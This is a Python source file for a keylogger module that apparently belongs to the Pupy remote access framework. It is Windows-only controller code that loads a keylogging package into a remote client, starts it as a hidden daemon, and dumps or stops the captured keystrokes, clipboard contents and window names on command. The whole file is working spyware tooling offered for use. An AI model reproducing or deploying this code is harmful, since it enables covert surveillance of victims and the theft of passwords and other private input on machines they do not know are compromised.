# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import StringIO
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="KeyloggerModule"

class KeyloggerModule(PupyModule):
	""" 
		A keylogger to monitor all keyboards interaction including the clipboard :-)
		The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
	"""
	#max_clients=1
	daemon=True
	unique_instance=True
	keylogger=None
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='keylogger', description=self.__doc__)
		self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

	@windows_only
	def is_compatible(self):
		pass

	def stop_daemon(self):
		self.success("keylogger stopped")
		
	def run(self, args):
		if args.action=="start":
			if self.keylogger:
				self.error("the keylogger is already started")
			else:
				self.client.load_package("pupwinutils.keylogger")
				with redirected_stdio(self.client.conn): #to see the output exception in case of error
					self.keylogger=self.client.conn.modules["pupwinutils.keylogger"].KeyLogger()
					self.keylogger.start()
		else:
			if not self.keylogger:
				self.error("the keylogger is not running")
				return
			if args.action=="dump":
				self.success("dumping recorded keystrokes :")
				self.log(self.keylogger.dump())
			elif args.action=="stop":
				self.keylogger.stop()
				self.job.stop()



